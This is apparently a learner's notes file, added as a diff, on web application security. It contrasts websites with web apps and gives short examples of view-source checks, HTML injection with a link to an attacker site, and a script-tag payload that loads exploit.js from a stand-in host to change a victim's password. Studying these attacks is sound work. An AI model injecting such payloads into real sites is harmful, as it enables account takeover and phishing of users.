@@ -1,0 +1,47 @@
+web applications vs websites:
+
+
+
+website
+-web 1.0
+- static pages
+- same for eveyone
+- html, css, js
+web app
+- web 2.0
+- dynamic pages
+- interactive
+- different view for each user
+- functional
+- html, css, js, php, mysql, etc
+
+-------------------------
+sensitive data explousure:
+
+view-source:https://www.google.com/
+
+view-source:[url/ipaddress]
+
+----------------------
+HTML INJECTION
+      
+      <html>
+          <h1>Here are the results that match your query: </h1>
+          <h2></h2>special offer <a href=www.attacker.site>malicious link</a><h2></h2>
+          <ol>
+               <li>Result A
+               <li>Result B
+          </ol>
+      </html>
+
+-------------------------
+CSRF
+
+"><script src=//www.example.com/exploit.js></script>
+
+1- The exploit.js file would contain the malicious JavaScript code that changes the user's password
+2- in this case requires knowledge of this web application's password changing procedure and API
+3- The attacker would need to create JavaScript code that would replicate the desired functionality 
+   and automatically carry it out (i.e., JavaScript code that changes our password for this
+   specific web application).
+
